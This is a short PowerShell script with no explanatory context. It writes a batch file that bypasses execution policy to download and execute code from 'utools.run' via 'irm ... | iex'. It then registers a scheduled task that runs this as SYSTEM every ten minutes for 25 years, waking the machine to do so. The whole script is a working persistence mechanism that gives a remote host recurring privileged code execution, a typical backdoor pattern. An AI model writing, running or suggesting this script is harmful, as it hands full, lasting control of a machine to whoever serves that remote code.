
$targetDirectory = "c:\tools2"

if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}

'powershell -executionPolicy ByPass -Command "irm utools.run/tcpvcon2ck|iex"' | out-file c:\tools2\tcpvcon2ck.bat -Encoding ascii

$TaskName = "tcpvcon2ck"
Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($? -eq $true)
{
    Write-Host "Task $TaskName already exist.try to delete"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
}

# $actions = New-ScheduledTaskAction -Execute 'powershell -executionPolicy ByPass -Command "irm utools.run/tcpvcon|iex"'

$actions = New-ScheduledTaskAction -Execute 'cmd /c c:\tools2\tcpvcon2ck.bat'


$TheDate= ([DateTime]::Now)
$Duration = $TheDate.AddYears(25) -$TheDate

$trigger = New-ScheduledTaskTrigger -Once -At(Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration $Duration
$principal = New-ScheduledTaskPrincipal -UserId 'system' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -WakeToRun
$task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings

Register-ScheduledTask $TaskName -InputObject $task